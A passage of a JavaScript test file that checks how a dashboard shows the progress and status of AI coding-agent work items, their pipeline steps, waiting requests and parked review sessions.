    "ship:pending:0",
  ]);
  // Before its brief names its type, an auto flow knows only its brief.
  deepStrictEqual(stripText(stripOf(flowOf({ type: "" }), false)), [
    "brief:pending:0",
  ]);
});

test("a manual flow shows every cell, lit only where launched, with how often", () => {
  deepStrictEqual(MANUAL_CELLS, [
    "workitem",
    "spec",
    "research",
    "debug",
    "plan",
    "build",
    "review",
    "security",
    "ship",
  ]);
  const flow = flowOf({
    cells: {
      brief: { at: 1, runs: 1, state: "done" },
      build: { at: 3, runs: 3, state: "done" },
      security: { at: 4, runs: 1, state: "running" },
    },
    mode: "manual",
    type: "",
  });
  deepStrictEqual(stripText(stripOf(flow, false)), [
    "workitem:done:1",
    "spec:pending:0",
    "research:pending:0",
    "debug:pending:0",
    "plan:pending:0",
    "build:done:3",
    "review:pending:0",
    "security:running:1",
    "ship:pending:0",
  ]);
});

test("in manual, the work item's cell stands for its brief, reproduction and proposal", () => {
  const flow = flowOf({
    cells: {
      brief: { at: 2, runs: 1, state: "running" },
      workitem: { at: 1, runs: 1, state: "done" },
    },
    mode: "manual",
    type: "bug",
  });
  strictEqual(stripText(stripOf(flow, false))[0], "workitem:running:1");
  strictEqual(
    statusOf(flow, { address: "t5", state: "live", status: "working" }).label,
    "FORGING · WORKITEM",
  );
});

test("an item's progress counts every pass of its steps, reviews too: a step run again adds one, a skipped one is not done", () => {
  const flow = flowOf({
    cells: {
      brief: { at: 1, runs: 1, state: "done" },
      build: { at: 5, runs: 1, state: "done" },
      plan: { at: 4, runs: 1, state: "done" },
      research: { at: 3, runs: 0, state: "skipped" },
      review: { at: 6, runs: 3, state: "done" },
      security: { at: 7, runs: 1, state: "done" },
      spec: { at: 2, runs: 1, state: "done" },
    },
  });
  deepStrictEqual(progressOf(stripOf(flow, false)), {
    done: 8,
    of: 10,
    steps: [
      "done",
      "done",
      "skipped",
      "done",
      "done",
      "done",
      "done",
      "done",
      "done",
      "pending",
    ],
  });
  // A step at work again: its earlier passes are done, the one at work is not yet.
  const again = flowOf({
    cells: { build: { at: 1, runs: 2, state: "running" } },
    type: "change",
  });
  deepStrictEqual(progressOf(stripOf(again, false)).steps, [
    "pending",
    "pending",
    "done",
    "running",
    "pending",
    "pending",
    "pending",
  ]);
});

test("a session that has quit its agent has ended; a finished item at work again forges", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [{ id: "tb1", name: "claude" }],
  };
  const forges = [{ key: "/code/orders/.git", main, spaces: [main] }];
  const flows = [
    flowOf({
      cells: { plan: { at: 2, runs: 1, state: "running" } },
      key: "#1",
      terminal: "t1",
    }),
    flowOf({
      cells: {
        build: { at: 5, runs: 2, state: "running" },
        ship: { at: 4, runs: 1, state: "done" },
      },
      key: "#2",
      terminal: "t2",
    }),
    flowOf({
      cells: { ship: { at: 4, runs: 1, state: "done" } },
      key: "#3",
      terminal: "t3",
    }),
  ];
  const shell = { agent: false };
  const agent = { agent: true };
  const panes = [
    { branch: "a", program: shell, tab: "tb1", terminal: "t1", title: "zsh" },
    { branch: "b", program: agent, tab: "tb1", terminal: "t2", title: "two" },
    { branch: "c", program: shell, tab: "tb1", terminal: "t3", title: "zsh" },
  ];
  const terminals = ["t1", "t2", "t3"].map((address) => ({
    address,
    state: "live",
    status: "idle",
  }));
  const [{ cards }] = floorOf({
    flows,
    forges,
    panes,
    requests: [],
    terminals,
  });
  deepStrictEqual(
    cards.map((card) => [card.key, card.status.label]),
    [
      ["#2", "FORGING · BUILD"],
      ["#1", "ENDED"],
    ],
  );
});

test("a card waits while an agent its session dispatched waits, and its chip goes to the inbox", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [{ id: "tb1", name: "claude" }],
  };
  const forges = [{ key: "/code/orders/.git", main, spaces: [main] }];
  const flows = [
    flowOf({
      cells: { build: { at: 3, runs: 1, state: "running" } },
      terminal: "t1",
    }),
  ];
  const panes = [
    {
      branch: "a",
      program: { agent: true },
      tab: "tb1",
      terminal: "t1",
      title: "one",
    },
  ];
  const terminals = [
    { address: "t1", state: "live", status: "idle" },
    {
      address: "t9",
      labels: { "forge.parent": "t1" },
      state: "live",
      status: "blocked",
    },
  ];
  const requests = [{ kind: "permission", terminal: "t9", tool_input: {} }];
  const [{ cards }] = floorOf({ flows, forges, panes, requests, terminals });
  deepStrictEqual(
    cards.map((card) => [card.status.label, card.inbox]),
    [["WAITING · PERMISSION", true]],
  );
});

test("a cracked golem is named by the cell it is on, not by an old failure", () => {
  const flow = flowOf({
    cells: {
      debug: { at: 1, runs: 1, state: "failed" },
      plan: { at: 5, runs: 1, state: "running" },
    },
    mode: "manual",
  });
  strictEqual(
    statusOf(flow, {
      address: "t5",
      labels: { "forge.state": "cracked" },
      state: "live",
      status: "idle",
    }).label,
    "CRACKED · PLAN",
  );
});

test("a step that will not run shows so: skipped, or never launched once the flow is over", () => {
  const flow = flowOf({
    cells: {
      brief: { at: 1, runs: 1, state: "done" },
      research: { at: 2, runs: 0, state: "skipped" },
      ship: { at: 3, runs: 1, state: "done" },
    },
  });
  deepStrictEqual(stripText(stripOf(flow, false)).slice(0, 3), [
    "brief:done:1",
    "spec:pending:0",
    "research:skipped:0",
  ]);
  deepStrictEqual(stripText(stripOf(flow, false, true)).slice(0, 3), [
    "brief:done:1",
    "spec:skipped:0",
    "research:skipped:0",
  ]);
});

test("a finished item leaves the floor once its session ends; one left half way stays as ended", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [{ id: "tb1", name: "claude" }],
  };
  const forges = [{ key: "/code/orders/.git", main, spaces: [main] }];
  const shipped = { ship: { at: 9, runs: 1, state: "done" } };
  const flows = [
    flowOf({ cells: shipped, key: "#1", terminal: "t1" }),
    flowOf({ cells: shipped, key: "#2", terminal: "t2" }),
    flowOf({
      cells: { plan: { at: 2, runs: 1, state: "done" } },
      key: "#3",
      terminal: "t3",
    }),
  ];
  const panes = [
    {
      branch: "a",
      program: { agent: true },
      tab: "tb1",
      terminal: "t1",
      title: "one",
    },
  ];
  const terminals = [{ address: "t1", state: "live", status: "idle" }];
  const [{ cards }] = floorOf({
    flows,
    forges,
    panes,
    requests: [],
    terminals,
  });
  deepStrictEqual(
    cards.map((card) => [card.key, card.status.label]),
    [
      ["#1", "DONE"],
      ["#3", "ENDED"],
    ],
  );
});

test("a step and the next a moment apart: the work item's cell takes the later one", () => {
  const flow = flowOf({
    cells: {
      brief: { at: 7, runs: 1, state: "done" },
      reproduce: { at: 7, runs: 1, state: "running" },
      workitem: { at: 7, runs: 1, state: "done" },
    },
    mode: "manual",
    type: "bug",
  });
  strictEqual(stripText(stripOf(flow, false))[0], "workitem:running:1");
});

test("build tasks say whether the build is at work or done; a session whose agent works for it forges", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [{ id: "tb1", name: "claude" }],
  };
  const forges = [{ key: "/code/orders/.git", main, spaces: [main] }];
  const tasks = { marks: ["green", "green"], of: 2 };
  const flows = [
    flowOf({
      cells: { build: { at: 3, runs: 1, state: "running" } },
      key: "#1",
      tasks,
      terminal: "t1",
    }),
    flowOf({
      cells: {
        build: { at: 3, runs: 1, state: "done" },
        security: { at: 4, runs: 1, state: "running" },
      },
      key: "#2",
      tasks,
      terminal: "t2",
    }),
  ];
  const panes = [
    {
      branch: "a",
      program: { agent: true },
      tab: "tb1",
      terminal: "t1",
      title: "one",
    },
    {
      branch: "b",
      program: { agent: true },
      tab: "tb1",
      terminal: "t2",
      title: "two",
    },
  ];
  const terminals = [
    { address: "t1", state: "live", status: "working" },
    { address: "t2", state: "live", status: "idle" },
    {
      address: "t3",
      labels: {
        "forge.agent": "forgerdr:security-auditor",
        "forge.parent": "t2",
      },
      state: "live",
      status: "working",
    },
  ];
  const [{ cards }] = floorOf({
    flows,
    forges,
    panes,
    requests: [],
    terminals,
  });
  deepStrictEqual(
    cards.map((card) => [
      card.key,
      card.tasks?.building,
      card.progress.done,
      card.status.label,
    ]),
    [
      ["#1", true, 0, "FORGING · BUILD"],
      ["#2", false, 1, "FORGING · SECURITY"],
    ],
  );
});

test("a card's flow is done once its pipeline's last cell is, and a break mends once another cell runs", () => {
  const live = { address: "t5", state: "live", status: "working" };
  strictEqual(
    statusOf(
      flowOf({
        cells: { comment: { at: 3, runs: 1, state: "done" } },
        type: "content",
      }),
      { ...live, status: "idle" },
    ).label,
    "DONE",
  );
  strictEqual(
    statusOf(
      flowOf({
        cells: {
          debug: { at: 2, runs: 1, state: "failed" },
          plan: { at: 3, runs: 1, state: "running" },
        },
        mode: "manual",
      }),
      live,
    ).label,
    "FORGING · PLAN",
  );
});

test("a cell launched by hand in an auto flow joins its strip; review lights while a reviewer works", () => {
  const flow = flowOf({
    cells: {
      debug: { at: 5, runs: 2, state: "done" },
      review: { at: 4, runs: 2, state: "done" },
    },
    type: "change",
  });
  deepStrictEqual(stripText(stripOf(flow, true)), [
    "spec:pending:0",
    "plan:pending:0",
    "build:pending:0",
    "review:running:2",
    "security:pending:0",
    "ship:pending:0",
    "debug:done:2",
  ]);
});

test("build tasks: the one at work, red or next, of how many", () => {
  deepStrictEqual(
    tasksOf(
      {
        marks: ["green", "green", "reviewed", "green", "red"],
        name: "restore_after_restart",
        of: 8,
      },
      true,
    ),
    {
      at: 5,
      building: true,
      marks: [
        "green",
        "green",
        "reviewed",
        "green",
        "red",
        "pending",
        "pending",
        "pending",
      ],
      name: "restore_after_restart",
      of: 8,
      red: true,
    },
  );
  strictEqual(tasksOf({ marks: ["green", null, "green"], of: 3 }, true).at, 2);
  strictEqual(tasksOf({ marks: ["green", "green"], of: 2 }, true).at, 2);
  strictEqual(
    tasksOf({ marks: ["green", "green"], of: 2 }, false).building,
    false,
  );
  strictEqual(tasksOf(null, true), null);
});

test("a dev server's port comes from its tab", () => {
  strictEqual(portOf([{ name: "claude" }, { name: "dev :4102" }]), 4102);
  strictEqual(portOf([{ name: "dev server" }]), undefined);
});

test("a card says what its flow waits on first, then whether it broke, is done, has ended or forges", () => {
  const live = (status, labels = {}) => ({
    address: "t5",
    labels,
    state: "live",
    status,
  });
  const gate = {
    kind: "gate",
    terminal: "t5",
    tool_input: {
      questions: [{ header: "Gate commit", options: [], question: "Commit?" }],
    },
  };
  const running = flowOf({
    cells: { plan: { at: 2, runs: 1, state: "running" } },
  });
  const status = (flow, terminal, request) => {
    const { kind, label } = statusOf(flow, terminal, request);
    return `${kind}|${label}`;
  };
  strictEqual(
    status(running, live("blocked"), gate),
    "waiting|WAITING · COMMIT GATE",
  );
  strictEqual(
    status(running, live("blocked"), { ...gate, kind: "plan" }),
    "waiting|WAITING · PLAN",
  );
  strictEqual(
    status(
      flowOf({ cells: { plan: { at: 2, runs: 1, state: "waiting" } } }),
      live("done"),
    ),
    "waiting|WAITING · PLAN GATE",
  );
  strictEqual(status(running, live("blocked")), "waiting|WAITING");
  strictEqual(
    status(running, live("idle", { "forge.state": "cracked" })),
    "cracked|CRACKED · PLAN",
  );
  strictEqual(
    status(
      flowOf({ cells: { reproduce: { at: 2, runs: 1, state: "failed" } } }),
      live("idle"),
    ),
    "cracked|CRACKED · REPRODUCE",
  );
  const shipped = flowOf({
    cells: { ship: { at: 9, runs: 1, state: "done" } },
    pr: { number: 40, url: "u" },
  });
  strictEqual(status(shipped, undefined), "done|DONE · PR #40");
  strictEqual(status(running, undefined), "ended|ENDED");
  strictEqual(status(running, live("working")), "forging|FORGING · PLAN");
  strictEqual(
    status(
      flowOf({ cells: { "root-cause": { at: 3, runs: 1, state: "done" } } }),
      live("idle"),
    ),
    "forging|FORGING · ROOT CAUSE",
  );
  strictEqual(CARD_STATUS.waiting, "waiting");
  strictEqual(FLOW_CELL.rootCause, "root-cause");
});

test("the floor: every forge in the bar's order, its cards by urgency, then its untracked sessions", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [
      { id: "tb1", name: "claude · main" },
      { id: "tb5", name: "claude · review" },
    ],
  };
  const worktree = {
    id: "sp2",
    name: "approval-inbox",
    tabs: [
      { id: "tb2", name: "claude · inbox" },
      { id: "tb3", name: "dev :4102" },
    ],
  };
  const dotfiles = {
    id: "sp3",
    name: "dotfiles",
    tabs: [{ id: "tb4", name: "shell" }],
  };
  const forges = [
    { key: "/code/orders/.git", main, spaces: [main, worktree] },
    { key: "space:sp3", main: dotfiles, spaces: [dotfiles] },
  ];
  const agent = { agent: true };
  const panes = [
    {
      branch: "main",
      program: agent,
      tab: "tb1",
      terminal: "t5",
      title: "claude · main",
    },
    {
      branch: "feature/#12-approval-inbox",
      program: agent,
      tab: "tb2",
      terminal: "t6",
      title: "claude · inbox",
    },
    {
      branch: null,
      program: { agent: false },
      tab: "tb3",
      terminal: "t7",
      title: "dev",
    },
    {
      branch: "main",
      program: agent,
      tab: "tb5",
      terminal: "t8",
      title: "claude · review",
    },
    {
      branch: null,
      program: agent,
      tab: "tb4",
      terminal: "t2",
      title: "claude · dots",
    },
  ];
  const terminals = [
    { address: "t5", state: "live", status: "working" },
    { address: "t6", state: "live", status: "blocked" },
    { address: "t7", state: "live", status: "idle" },
    { address: "t8", state: "live", status: "idle" },
    { address: "t2", state: "live", status: "idle" },
    {
      address: "t9",
      labels: { "forge.agent": "forgerdr:reviewer", "forge.parent": "t5" },
      state: "live",
      status: "working",
    },
  ];
  const flows = [
    flowOf({
      cells: { build: { at: 3, runs: 1, state: "running" } },
      created: 1,
      terminal: "t5",
    }),
    flowOf({
      cells: { plan: { at: 3, runs: 1, state: "running" } },
      created: 2,
      key: "#12",
      terminal: "t6",
    }),
    flowOf({
      created: 3,
      key: "#7",
      repo: "/code/shop/.git",
      terminal: "t40",
      title: "lanes overflow",
    }),
    flowOf({ created: 4, key: "#41", terminal: "t41" }),
    flowOf({ created: 5, key: "#42", repo: "", terminal: "t42" }),
  ];
  const requests = [{ kind: "permission", terminal: "t6", tool_input: {} }];
  const floor = floorOf({ flows, forges, panes, requests, terminals });
  deepStrictEqual(
    floor.map((forge) => [
      forge.key,
      forge.name,
      forge.cards.map((card) => card.key),
      forge.untracked.map((one) => one.terminal),
    ]),
    [
      ["/code/orders/.git", "orders", ["#12", "#15", "#41"], ["t8"]],
      ["space:sp3", "dotfiles", [], ["t2"]],
      ["/code/shop/.git", "shop", ["#7"], []],
      ["elsewhere", "elsewhere", ["#42"], []],
    ],
  );
  const [waiting, forging] = floor[0].cards;
  deepStrictEqual(
    [waiting.status.label, waiting.branch, waiting.port],
    ["WAITING · PERMISSION", "feature/#12-approval-inbox", 4102],
  );
  deepStrictEqual(
    [forging.status.label, forging.branch, forging.port],
    ["FORGING · BUILD", "main", undefined],
  );
  strictEqual(
    forging.strip.find((cell) => cell.cell === "review").state,
    "running",
  );
  deepStrictEqual(floor[0].untracked[0], {
    space: "orders",
    status: "idle",
    terminal: "t8",
    title: "claude · review",
  });
  deepStrictEqual(floor[0].counts, {
    cracked: 0,
    done: 0,
    forging: 1,
    waiting: 1,
  });
  deepStrictEqual(floorCounts(floor), {
    cracked: 0,
    done: 0,
    forging: 1,
    waiting: 1,
  });
  strictEqual(floor[2].cards[0].status.kind, "ended");
  strictEqual(floorMood(floor[0].counts), "needs");
  strictEqual(
    floorMood({ cracked: 1, done: 1, forging: 1, waiting: 0 }),
    "error",
  );
  strictEqual(
    floorMood({ cracked: 0, done: 0, forging: 0, waiting: 0 }),
    "idle",
  );
});

test("a review session's pick and comment gate wait in its view, not as options in the inbox", () => {
  /** @param {string} header @param {string} terminal */
  const asked = (header, terminal) => ({
    agent_type: "",
    created: 1,
    cwd: "/r",
    id: "a",
    kind: header.startsWith("Gate ") ? "gate" : "question",
    session_id: "s",
    terminal,
    tool_input: {
      questions: [
        {
          header,
          options: [{ label: "Publish" }, { label: "Not yet" }],
          question: "Publish?",
        },
      ],
    },
    tool_name: "AskUserQuestion",
  });
  const terminals = [
    { address: "t7", labels: { "forge.review": "other" } },
    { address: "t8", labels: {} },
  ];
  strictEqual(reviewAskOf(asked("Review pick", "t7"), terminals), true);
  strictEqual(reviewAskOf(asked("Gate comment", "t7"), terminals), true);
  strictEqual(reviewAskOf(asked("Gate commit", "t7"), terminals), false);
  strictEqual(reviewAskOf(asked("Gate comment", "t8"), terminals), false);
  strictEqual(reviewAskOf(asked("Review pick", "t9"), terminals), false);
});

test("a review session's question takes the human to its review's tab", () => {
  const terminals = [
    {
      address: "t7",
      labels: { "forge.review": "other", "forge.tab": "tb-42" },
    },
    { address: "t8", labels: {} },
  ];
  strictEqual(reviewTabOf("t7", terminals), "tb-42");
  strictEqual(reviewTabOf("t8", terminals), "");
  strictEqual(reviewTabOf("t9", terminals), "");
});

const REVIEW_SPACES = [
  { id: "sp1", tabs: [{ id: "tb-1" }, { id: "tb-42" }] },
  { id: "sp2", tabs: [{ id: "tb-9" }] },
];
const CLAUDE_PROGRAM = {
  agent: true,
  color: null,
  icon: null,
  key: "claude",
  name: "Claude Code",
  shell: false,
  tile: null,
  tint: false,
};

test("a review session parked behind its view is in the space of the view's tab", () => {
  strictEqual(
    spaceOfTerminal(
      { address: "t7", labels: { "forge.tab": "tb-42" } },
      REVIEW_SPACES,
    ),
    "sp1",
  );
  strictEqual(
    spaceOfTerminal(
      { address: "t8", labels: { "herdr.space": "sp2" } },
      REVIEW_SPACES,
    ),
    "sp2",
  );
  strictEqual(
    spaceOfTerminal({ address: "t9", labels: {} }, REVIEW_SPACES),
    null,
  );
});

test("a parked review session is a golem of its view's forge, at work as its terminal says", () => {
  const listed = [{ address: "t5", space: "sp2", status: "idle" }];
  const terminals = [
    { address: "t5", labels: { "herdr.space": "sp2" }, status: "idle" },
    {
      address: "t7",
      labels: { "forge.tab": "tb-42" },
      program: CLAUDE_PROGRAM,
      state: "live",
      status: "working",
      title: "PR 42",
    },
    {
      address: "t8",
      labels: { "forge.tab": "tb-gone" },
      program: CLAUDE_PROGRAM,
      state: "live",
      status: "working",
    },
    {
      address: "t9",
      labels: { "forge.tab": "tb-42" },
      program: CLAUDE_PROGRAM,
      state: "finished",
      status: "idle",
    },
  ];
  deepStrictEqual(
    withParkedAgents(listed, terminals, REVIEW_SPACES).map((agent) => [
      agent.address,
      agent.space,
      agent.tab,
      agent.status,
      agent.pane,
    ]),
    [
      ["t5", "sp2", undefined, "idle", undefined],
      ["t7", "sp1", "tb-42", "working", ""],
    ],
  );
});

test("the golems a parked review session spawns have their lanes in its view's space", () => {
  const terminals = [
    {
      address: "t7",
      labels: { "forge.tab": "tb-42" },
      records: { a1: { state: "working", title: "explore" } },
      state: "live",
      status: "working",
      title: "PR 42",
    },
  ];
  strictEqual(spaceLanes("sp1", terminals, {}, {}, REVIEW_SPACES).length, 1);
  strictEqual(spaceLanes("sp2", terminals, {}, {}, REVIEW_SPACES).length, 0);
});

test("a parked review session goes once its view's tab, seen alive before, is gone; never at a start that has not seen it", () => {
  const terminals = [
    { address: "t7", labels: { "forge.tab": "tb-42" }, state: "live" },
    { address: "t8", labels: { "forge.tab": "tb-9" }, state: "live" },
    { address: "t9", labels: {}, state: "live" },
  ];
  const first = orphanedReviews(terminals, [], new Set());
  deepStrictEqual(first.orphans, []);
  const second = orphanedReviews(terminals, REVIEW_SPACES, first.seen);
  deepStrictEqual(second.orphans, []);
  const third = orphanedReviews(
    terminals,
    [
      { id: "sp1", tabs: [{ id: "tb-1" }] },
      { id: "sp2", tabs: [{ id: "tb-9" }] },
    ],
    second.seen,
  );
  deepStrictEqual(third.orphans, ["t7"]);
});
